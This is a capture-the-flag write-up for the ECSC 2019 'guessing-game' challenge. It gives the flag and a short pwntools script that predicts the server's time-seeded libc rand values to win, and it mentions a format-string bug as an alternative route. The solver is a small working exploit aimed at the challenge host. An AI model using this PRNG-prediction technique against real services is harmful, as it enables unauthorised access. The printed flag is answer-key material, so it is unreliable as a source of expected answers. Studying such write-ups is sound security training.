# ECSC 2019
**Author: Feraru Mihail - mihailferaru2000@gmail.com - littlewho**

## guessing-game (100): Revexp

### Proof of flag
```
ECSC{9120848337A9760DDAE532BAF3D7D8E7032DFFFE6DD3B323A5F5CA0455B9C79C}
```

### Summary
We have two ways of solving this task:
* to use the string format vulnerability
* to use random prediciton
I took the second approach.

### Proof of solving
Solver script:
```python
from ctypes import *
from pwn import *

libc = CDLL('/lib64/libc.so.6')

#p = process('./a.out')
p = remote('37.128.230.46',50021)
p.sendline('mihai')
p.recv()
t = libc.time(0)
libc.srand(t)
a = libc.rand() % 1333337
b = libc.rand() % 1333337
c = libc.rand() % 1333337
log.info("{} {} {}".format(a, b, c))
log.info("{}".format(a+b+c))
p.sendline(str(a+b+c))

p.interactive()
```
